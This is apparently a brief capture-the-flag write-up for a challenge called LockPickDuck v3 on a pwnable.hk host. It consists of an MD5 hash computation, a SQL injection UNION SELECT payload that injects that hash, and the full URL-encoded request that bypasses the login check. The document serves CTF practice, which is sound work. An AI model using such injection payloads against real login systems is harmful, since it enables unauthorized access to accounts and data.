# LockPickDuck v3 (I) 爆鎖鴨第三代 (其一)

```
php > var_dump(md5('x'));
string(32) "9dd4e461268c8034f5c8564e155c67a6"
```

```
' UNION SELECT '9dd4e461268c8034f5c8564e155c67a6' -- 
```

```
http://hkoscon23.pwnable.hk:28001/?user=%27%20UNION%20SELECT%20%279dd4e461268c8034f5c8564e155c67a6%27%20--%20&pass=x
```
